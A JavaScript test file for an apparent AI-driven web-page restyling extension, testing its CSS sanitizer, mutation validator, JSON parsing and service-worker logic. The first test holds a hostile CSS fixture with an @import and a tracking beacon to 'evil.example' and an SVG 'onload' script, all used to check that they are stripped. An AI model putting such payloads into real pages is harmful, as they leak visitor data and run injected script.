import test from "node:test";
import assert from "node:assert/strict";

import { sanitizeAndValidateCSS } from "../shared/css-sanitizer.js";
import { validateMutations } from "../shared/mutation-validator.js";
import { parseLooseJson } from "../shared/json-utils.js";
import {
  isVisionCapable,
  deriveCustomModelsUrl,
  getGeminiFallbackChain,
  cloneContentsForDifferentGeminiModel
} from "../shared/providers.js";
import {
  compileUserTweaksCSS,
  compileBaseFloorCSS,
  compilePresetOnlyCSS,
  DEFAULT_USER_TWEAKS
} from "../shared/layout-blueprints.js";
import {
  STRUCTURAL_SLOT_BASE_CSS,
  HEALER_AND_SAFETY_CSS
} from "../shared/personal-profiles.js";
import { buildFullStylesheet, applyDesignToTab, isSupportedTabUrl } from "../service-worker.js";

test("CSS sanitizer blocks @import, external url beacons, SVG scripts, and root hiding", () => {
  const malicious = `
    @import url("https://evil.example/steal.css");
    html, body { display: none !important; opacity: 0.95; background: url("https://evil.example/track?id=1"); }
    .hero { background-image: url("data:image/svg+xml,<svg onload=alert(1)></svg>"); }
    .ok-local { background-image: url("/assets/bg.png"); }
    .ok-same { background-image: url("https://trusted.example/img/a.webp"); }
    .ok-data { background-image: url("data:image/png;base64,AAAA"); }
  `;
  const res = sanitizeAndValidateCSS(malicious, { pageOrigin: "https://trusted.example" });
  assert.equal(res.valid, false);
  assert.ok(!res.sanitizedCss.includes("@import"));
  assert.ok(!res.sanitizedCss.includes("https://evil.example/track"));
  assert.ok(!res.sanitizedCss.includes("onload=alert"));
  assert.ok(!res.sanitizedCss.includes("display: none"));
  assert.ok(res.sanitizedCss.includes("opacity: 0.95"), "Non-zero fractional opacity must NOT be stripped!");
  assert.ok(res.sanitizedCss.includes("/assets/bg.png"));
  assert.ok(res.sanitizedCss.includes("https://trusted.example/img/a.webp"));
  assert.ok(res.sanitizedCss.includes("data:image/png;base64,AAAA"));

  const zeroOpacity = sanitizeAndValidateCSS("body { opacity: 0 !important; }");
  assert.equal(zeroOpacity.valid, false);
  assert.ok(!zeroOpacity.sanitizedCss.includes("opacity: 0"));
});

test("CSS sanitizer detects unbalanced braces and warns on broad !important unhiding", () => {
  const broken = `header, nav { display: flex !important; } .card { color: white;`;
  const res = sanitizeAndValidateCSS(broken);
  assert.equal(res.valid, false);
  assert.ok(res.errors.some((e) => /Unclosed CSS block/i.test(e)));
  assert.ok(res.warnings.some((w) => /accidentally unhide/i.test(w)));
});

test("Mutation validator normalizes valid ops and rejects protected targets or unknown actions", () => {
  const ok = validateMutations([
    { action: "createSlot", slotRole: "top-command-bar", anchorSelector: "body", id: "rd-cmd!bar" },
    { action: "reparent", sourceId: "#search", targetId: "rd-cmd-bar" },
    { action: "createHeroFromElement", sourceSelector: ".card", badgeText: "Top Pick" }
  ]);
  assert.equal(ok.valid, true);
  assert.equal(ok.mutations.length, 3);
  assert.equal(ok.mutations[0].id, "rd-cmd-bar");
  assert.equal(ok.mutations[1].sourceSelector, "#search");
  assert.equal(ok.mutations[1].targetSelector, "rd-cmd-bar");

  const bad = validateMutations([
    { action: "setInert", selector: "body" },
    { action: "injectScript", selector: "head" },
    { action: "reparent", sourceSelector: "html", targetSelector: "#box" }
  ]);
  assert.equal(bad.valid, false);
  assert.equal(bad.mutations.length, 0);
  assert.equal(bad.errors.length, 3);
});

test("parseLooseJson handles think tags, markdown fences, trailing commas, and unescaped newlines", () => {
  const raw = `<think>reasoning here</think>\n\`\`\`json\n{"designDirection": "Clean Studio",\n"cssRules": "body {\ncolor: red;\n}",\n"domMutations": [],}\n\`\`\``;
  const parsed = parseLooseJson(raw);
  assert.equal(parsed.designDirection, "Clean Studio");
  assert.ok(parsed.cssRules.includes("color: red;"));
  assert.deepEqual(parsed.domMutations, []);
});

test("Providers helpers derive custom models URL, vision capabilities, and strip Gemini thoughtSignatures", () => {
  assert.equal(
    deriveCustomModelsUrl("http://localhost:11434/v1/chat/completions"),
    "http://localhost:11434/v1/models"
  );
  assert.equal(isVisionCapable("gpt-4.1", "custom"), true);
  assert.equal(isVisionCapable("llama-3.3-70b-versatile", "groq"), false);

  const chain = getGeminiFallbackChain("gemini-4-hydrogen", [
    { id: "gemini-3.1-flash-lite-preview" },
    { id: "gemini-flash-latest" },
    { id: "gemini-3.5-flash-lite" }
  ]);
  assert.equal(chain[0], "gemini-4-hydrogen");
  assert.equal(chain[1], "gemini-flash-latest", "General flash-latest should outrank flash-lite preview");

  const adapted = cloneContentsForDifferentGeminiModel([
    {
      role: "model",
      parts: [
        { thought: true, text: "internal" },
        { functionCall: { name: "read_dom_tree", args: { selector: "#masthead" } }, thoughtSignature: "sig123" }
      ]
    }
  ]);
  assert.equal(adapted[0].parts.length, 1);
  assert.equal(
    adapted[0].parts[0].thoughtSignature,
    "skip_thought_signature_validator",
    "Cross-model functionCall parts must carry Google's skip_thought_signature_validator sentinel"
  );
});

test("Stylesheet composition orders cascade cleanly, avoids duplicate base floor, and has no hidden lock", () => {
  assert.ok(!STRUCTURAL_SLOT_BASE_CSS.includes("data-rd-originally-hidden"));
  assert.ok(!HEALER_AND_SAFETY_CSS.includes("data-rd-originally-hidden"));

  const quickAdapter = compilePresetOnlyCSS("bento-command");
  const full = buildFullStylesheet({
    profileId: "editorial",
    layoutPreset: "bento-command",
    adapterCss: quickAdapter,
    tweaks: { ...DEFAULT_USER_TWEAKS, measureCh: 64, fontScale: 1.15 }
  });

  // Base floor marker appears only once (never duplicated between baseFloor & adapterCss)
  const baseMarkerCount = full.split('[data-rd-role="nav-list"]:not([hidden])').length - 1;
  assert.equal(baseMarkerCount, 1);

  // Structural slot base comes BEFORE adapter CSS, healer comes AFTER adapter CSS
  const slotIdx = full.indexOf("ReDesigner Structural Slot Baselines");
  const adapterIdx = full.indexOf("Site Structural Adapter CSS");
  const healerIdx = full.indexOf("ReDesigner Contrast Healer");
  assert.ok(slotIdx > 0 && slotIdx < adapterIdx && adapterIdx < healerIdx);

  // Tweaks CSS uses 1rem (not compounding 1em) and enforces measureCh
  const tweaksCss = compileUserTweaksCSS({ ...DEFAULT_USER_TWEAKS, measureCh: 62, fontScale: 1.2 });
  assert.ok(tweaksCss.includes("calc(1rem * var(--rd-font-scale"));
  assert.ok(tweaksCss.includes("max-width: min(var(--rd-measure), 95vw)"));
  assert.ok(compileBaseFloorCSS().includes(":not([hidden])"));
});

test("Service worker applyDesignToTab serializes concurrent calls per tab without orphaning CSS", async () => {
  const sessionStore = new Map();
  const activeCssSet = new Set();
  const opLog = [];

  globalThis.chrome = {
    storage: {
      session: {
        get: async (keys) => Object.fromEntries(keys.map((k) => [k, sessionStore.get(k)])),
        set: async (obj) => Object.entries(obj).forEach(([k, v]) => sessionStore.set(k, v)),
        remove: async (keys) => keys.forEach((k) => sessionStore.delete(k))
      },
      local: {
        get: async () => ({ userTweaks: DEFAULT_USER_TWEAKS }),
        set: async () => {}
      }
    },
    tabs: {
      get: async (id) => ({ id, url: "https://example.com/", active: true, windowId: 1 }),
      sendMessage: async (_id, msg) => {
        if (msg.action === "PING") return { status: "PONG" };
        return { status: "APPLIED", healStats: { healedSurfaces: 0, healedTexts: 0 }, mutationReport: { total: 0, applied: 0, skipped: 0, details: [] } };
      }
    },
    scripting: {
      insertCSS: async ({ css }) => {
        await new Promise((r) => setTimeout(r, 10));
        activeCssSet.add(css);
        opLog.push("insert");
      },
      removeCSS: async ({ css }) => {
        await new Promise((r) => setTimeout(r, 10));
        activeCssSet.delete(css);
        opLog.push("remove");
      }
    }
  };

  try {
    // Fire 5 concurrent updates (simulating rapid slider drags)
    await Promise.all([
      applyDesignToTab(42, { profileId: "obsidian", adapterCss: "/* 1 */ body { padding: 1px; }" }),
      applyDesignToTab(42, { profileId: "obsidian", adapterCss: "/* 2 */ body { padding: 2px; }" }),
      applyDesignToTab(42, { profileId: "obsidian", adapterCss: "/* 3 */ body { padding: 3px; }" }),
      applyDesignToTab(42, { profileId: "obsidian", adapterCss: "/* 4 */ body { padding: 4px; }" }),
      applyDesignToTab(42, { profileId: "obsidian", adapterCss: "/* 5 */ body { padding: 5px; }" })
    ]);

    // Exactly ONE stylesheet must remain active — ZERO orphaned CSS!
    assert.equal(activeCssSet.size, 1);
    const remaining = Array.from(activeCssSet)[0];
    assert.ok(remaining.includes("/* 5 */"));
  } finally {
    delete globalThis.chrome;
  }
});

test("isSupportedTabUrl permits standard web/file pages and rejects restricted Chrome URLs", () => {
  assert.equal(isSupportedTabUrl("https://news.ycombinator.com/"), true);
  assert.equal(isSupportedTabUrl("http://localhost:3000/dashboard"), true);
  assert.equal(isSupportedTabUrl("file:///tmp/demo.html"), true);

  assert.equal(isSupportedTabUrl("chrome://extensions"), false);
  assert.equal(isSupportedTabUrl("chrome-extension://abcdef/popup.html"), false);
  assert.equal(isSupportedTabUrl("about:blank"), false);
  assert.equal(isSupportedTabUrl("https://chromewebstore.google.com/detail/xyz"), false);
  assert.equal(isSupportedTabUrl("https://chrome.google.com/webstore/category/extensions"), false);
  assert.equal(isSupportedTabUrl(""), false);
});
